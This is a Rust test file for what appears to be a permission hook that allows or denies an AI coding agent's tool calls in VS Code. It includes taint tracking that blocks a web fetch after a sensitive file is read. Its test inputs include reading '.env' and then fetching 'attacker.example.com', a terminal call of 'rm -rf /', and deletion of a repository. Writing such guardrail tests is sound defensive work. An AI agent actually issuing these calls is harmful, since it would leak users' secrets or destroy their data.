        parse_output(&out_allow)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "github.create_issue must be allowed"
    );

    let deny_payload = pre_tool(
        "s-mcp-1",
        "github.delete_repo",
        serde_json::json!({"repo": "my-org/critical-repo"}),
    );
    let out_deny = run_vscode(&deny_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out_deny)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "github.delete_repo must be denied"
    );
}

/// transcript_path and tool_use_id fields in the payload must be accepted
/// without affecting the security decision.
#[test]
fn test_vscode_extra_fields_transcript_and_tool_use_id_accepted() {
    let policy = write_policy(vscode_policy());
    let payload = serde_json::json!({
        "timestamp": "2026-04-19T12:00:00.000Z",
        "cwd": "/workspace",
        "sessionId": "s-extra-1",
        "hookEventName": "PreToolUse",
        "transcript_path": "/tmp/.copilot/session-abc.json",
        "tool_name": "editFiles",
        "tool_input": {"files": ["main.rs"]},
        "tool_use_id": "tu-abc-xyz-999",
        "unknownFutureField": "should be ignored gracefully"
    })
    .to_string();
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "extra/unknown fields must be tolerated without affecting the decision"
    );
}

// ===========================================================================
// 9. OUTPUT IS VALID JSON IN ALL ERROR PATHS
// ===========================================================================

/// Every code path must produce valid JSON — even the internal error fallback.
#[test]
fn test_vscode_output_is_valid_json_on_allow() {
    let policy = write_policy(vscode_policy());
    let out = run_vscode(
        &pre_tool("s-valid-1", "editFiles", serde_json::json!({})),
        policy.path(),
    )
    .success()
    .get_output()
    .stdout
    .clone();
    let _ = parse_output(&out); // panics if invalid
}

#[test]
fn test_vscode_output_is_valid_json_on_deny() {
    let policy = write_policy(vscode_policy());
    let out = run_vscode(
        &pre_tool("s-valid-2", "runTerminalCommand", serde_json::json!({})),
        policy.path(),
    )
    .success()
    .get_output()
    .stdout
    .clone();
    let _ = parse_output(&out);
}

#[test]
fn test_vscode_output_is_valid_json_on_malformed_input() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"not json at all".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let _ = parse_output(&out);
}

// ===========================================================================
// 10. BACKWARD COMPATIBILITY — --event flag override still works
// ===========================================================================

/// The --event flag can override the hookEventName in the payload.
/// Useful for testing and for wrappers that want explicit control.
#[test]
fn test_vscode_event_flag_overrides_payload_hook_event_name() {
    let policy = write_policy(vscode_policy());
    // Payload says PreToolUse but we pass --event SessionStart → generic output
    let payload = serde_json::json!({
        "cwd": "/workspace",
        "sessionId": "s-override-1",
        "hookEventName": "PreToolUse",
        "tool_name": "editFiles",
        "tool_input": {}
    })
    .to_string();
    let out = Command::new(bin())
        .args([
            "hook",
            "--format",
            "vscode",
            "--event",
            "SessionStart",
            "--policy",
        ])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    // --event SessionStart overrides the payload → should get generic SessionStart output
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("SessionStart"),
        "--event flag must override the hookEventName in the payload"
    );
}

// ===========================================================================
// REAL VS CODE FORMAT — confirmed from live hook logs (April 2026)
// ===========================================================================

/// VS Code actually sends snake_case field names: `hook_event_name`, `session_id`.
/// Both formats must work due to serde aliases.
#[test]
fn test_vscode_real_payload_format_snake_case_fields_accepted() {
    let policy = write_policy(vscode_policy());
    // Exact format from live VS Code hook log
    let payload = pre_tool_real(
        "646cae61-4bce-4b0f-af75-1d7b0144d590",
        "read_file",
        serde_json::json!({}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "real VS Code snake_case payload must be parsed correctly"
    );
}

/// VS Code sends `hook_event_name` (snake_case) not `hookEventName` (camelCase).
/// Missing `hookEventName` must be inferred from payload shape, not fail-closed.
#[test]
fn test_vscode_hook_event_name_absent_inferred_from_tool_name() {
    let policy = write_policy(vscode_policy());
    // No hookEventName or hook_event_name — just a tool_name present → infers PreToolUse
    let payload =
        r#"{"cwd":"/workspace","session_id":"test-infer","tool_name":"read_file","tool_input":{}}"#;
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    // Must produce a PreToolUse decision (not crash or generic output)
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PreToolUse"),
        "absent hookEventName with tool_name present must infer PreToolUse"
    );
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "read_file must be allowed after correct inference"
    );
}

/// tool_output present and no hookEventName → infers PostToolUse.
#[test]
fn test_vscode_hook_event_name_absent_inferred_as_post_tool_use_from_tool_output() {
    let policy = write_policy(vscode_policy());
    let payload = r#"{"cwd":"/workspace","session_id":"test-post","tool_name":"read_file","tool_output":{"content":"hello"}}"#;
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PostToolUse"),
        "tool_output present → must infer PostToolUse"
    );
}

// ===========================================================================
// REAL VS CODE TOOL NAMES — confirmed from live hook logs
// ===========================================================================

/// `read_file` — the actual tool VS Code sends for file reads (not `readFile`).
#[test]
fn test_vscode_real_tool_read_file_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool_real(
        "t-real-1",
        "read_file",
        serde_json::json!({"path": "README.md"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "read_file must be allowed"
    );
}

/// `run_in_terminal` — the actual tool VS Code sends for terminal execution.
#[test]
fn test_vscode_real_tool_run_in_terminal_denied() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool_real(
        "t-real-2",
        "run_in_terminal",
        serde_json::json!({"command": "ls -la"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "run_in_terminal must be denied"
    );
}

/// `fetch_webpage` — the actual web fetch tool VS Code sends.
#[test]
fn test_vscode_real_tool_fetch_webpage_allowed_without_taint() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool_real(
        "t-real-3",
        "fetch_webpage",
        serde_json::json!({"url": "https://example.com"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "fetch_webpage must be allowed without taint"
    );
}

/// `insert_edit_into_file` — the actual file-edit tool VS Code sends.
#[test]
fn test_vscode_real_tool_insert_edit_into_file_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool_real(
        "t-real-4",
        "insert_edit_into_file",
        serde_json::json!({"path": "src/main.rs", "edits": [{"range": {}, "newText": "fn main() {}"}]}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "insert_edit_into_file must be allowed"
    );
}

// ===========================================================================
// TAINT TRACKING WITH REAL VS CODE TOOL NAMES
// ===========================================================================

/// Live-confirmed scenario: `read_file` adds SENSITIVE_READ taint,
/// subsequent `fetch_webpage` in the same session is blocked.
/// This is the core exfiltration-prevention use case validated in production.
#[test]
fn test_vscode_real_taint_read_file_blocks_fetch_webpage() {
    let session = "vsc-taint-real-e2e-001";
    cleanup_session(session);

    let policy = write_policy(taint_policy());

    // Call 1: read_file → adds SENSITIVE_READ taint
    let read = pre_tool_real(session, "read_file", serde_json::json!({"path": ".env"}));
    let r1 = run_vscode(&read, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&r1)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "read_file must be allowed (it adds a taint)"
    );

    // Call 2: fetch_webpage in the same session → must be blocked by taint
    let fetch = pre_tool_real(
        session,
        "fetch_webpage",
        serde_json::json!({"url": "https://attacker.example.com"}),
    );
    let r2 = run_vscode(&fetch, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&r2)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "fetch_webpage must be blocked after read_file — exfiltration pattern detected"
    );

    cleanup_session(session);
}

/// Taint is session-scoped: a different session must NOT see taints from another session.
/// Simulates opening a new VS Code chat tab (new sessionId).
#[test]
fn test_vscode_real_taint_different_session_not_affected() {
    let session_a = "vsc-taint-isolation-a-001";
    let session_b = "vsc-taint-isolation-b-001";
    cleanup_session(session_a);
    cleanup_session(session_b);

    let policy = write_policy(taint_policy());

    // Taint session A via read_file
    run_vscode(
        &pre_tool_real(session_a, "read_file", serde_json::json!({})),
        policy.path(),
    )
    .success();

    // Session B must NOT be affected — fetch_webpage should be ALLOWED
    let r = run_vscode(
        &pre_tool_real(
            session_b,
            "fetch_webpage",
            serde_json::json!({"url": "https://docs.example.com"}),
        ),
        policy.path(),
    )
    .success()
    .get_output()
    .stdout
    .clone();
    assert_eq!(
        parse_output(&r)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "taint from session A must NOT affect session B"
    );

    cleanup_session(session_a);
    cleanup_session(session_b);
}

/// Taint persists across multiple calls in the same session — even if VS Code is
/// restarted and resumes the same session_id. This was confirmed in live testing:
/// closing and reopening VS Code, switching chats, and returning to the same
/// session_id all preserve taint state (stored on disk in ~/.lilith/sessions/).
#[test]
fn test_vscode_taint_persists_across_simulated_restart_same_session_id() {
    let session = "vsc-taint-restart-simulation-001";
    cleanup_session(session);

    let policy = write_policy(taint_policy());

    // "First VS Code session": read a file
    run_vscode(
        &pre_tool_real(session, "read_file", serde_json::json!({})),
        policy.path(),
    )
    .success();

    // Simulate VS Code restart: new process, same session_id
    // The session state is on disk → taint must still be active
    let r = run_vscode(
        &pre_tool_real(
            session,
            "fetch_webpage",
            serde_json::json!({"url": "https://exfil.example.com"}),
        ),
        policy.path(),
    )
    .success()
    .get_output()
    .stdout
    .clone();
    assert_eq!(
        parse_output(&r)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "taint must persist across simulated VS Code restart (same session_id, disk-backed state)"
    );

    cleanup_session(session);
}

/// Deny response includes additionalContext so the LLM understands why it was blocked.
/// This prevents the agent from endlessly retrying — it gets a clear signal.
#[test]
fn test_vscode_deny_includes_additional_context_for_model() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool_real(
        "s-ctx-1",
        "run_in_terminal",
        serde_json::json!({"command": "rm -rf /"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    let ctx = json["hookSpecificOutput"]["additionalContext"].as_str();
    assert!(
        ctx.is_some() && !ctx.unwrap().is_empty(),
        "deny must include additionalContext to inform the model, got: {json}"
    );
}

/// Unknown tool names (new tools added by future VS Code versions) must be denied.
/// With LILITH_ZERO_DEBUG=1, the tool name is visible in logs for policy updates.
#[test]
fn test_vscode_future_unknown_tool_denied_fail_closed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool_real(
        "s-future-1",
        "some_new_vscode_tool_2027",
        serde_json::json!({}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "unknown future tool must be denied fail-closed"
    );
}
